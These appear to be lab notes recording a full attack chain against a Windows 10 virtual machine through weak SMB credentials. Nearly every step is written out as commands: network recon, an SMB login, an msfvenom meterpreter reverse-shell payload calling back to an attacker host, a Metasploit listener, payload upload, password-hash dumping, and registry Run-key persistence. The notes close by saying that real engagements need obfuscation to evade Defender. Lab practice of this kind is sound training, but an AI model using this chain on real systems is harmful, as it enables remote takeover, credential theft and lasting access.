## Payload Delivery + Persistence via SMB (Lab Notes) ##

Target: Win10 VM (192.168.56.106), local user `user2` with weak SMB creds.

## 1. Recon
```
nmap -sV -sC -Pn --open 192.168.56.106
```
Found: 135 (msrpc), 139/445 (SMB), 5357 (http). SMB signing enabled but not required.

## 2. SMB Access (initial foothold)
```
smbclient -L 192.168.56.106 -U user2
smbclient //192.168.56.106/Users -U user2
```
Password: weak creds set on `user2` account. Got read/write access to `C:\Users\user2`.

## 3. Build the payload
On Kali:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe -o payload.exe
```

## 4. Start the listener
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.56.104
set LPORT 4444
run
```

## 5. Deliver the payload via SMB
Inside the smbclient session:
```
cd Desktop
put payload.exe
```

## 6. Execute
Manually ran `payload.exe` on the Win10 VM (double-click) to trigger the callback.
Result: meterpreter session opened.

## 7. Post-exploitation basics
```
sysinfo
ls
hashdump
```

## 8. Persistence
```
background
use exploit/windows/local/persistence
set SESSION <session_id>
run
```
This drops a `.vbs` script in `%TEMP%` and adds a Registry Run key
(`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random>`) so it
attempts to run on every login of that user.

## Result / Notes
- Raw msfvenom payload was NOT blocked by Windows Defender in real-time,
  but was caught later by a signature-based scan (Defender flagged and
  likely quarantined the payload + persistence script).
- Takeaway: raw/unencoded msfvenom payloads are reliably detected by
  any properly updated Defender — real engagements need
  encoding/obfuscation to evade detection. This chain proves impact of
  weak SMB creds + write access, not stealth.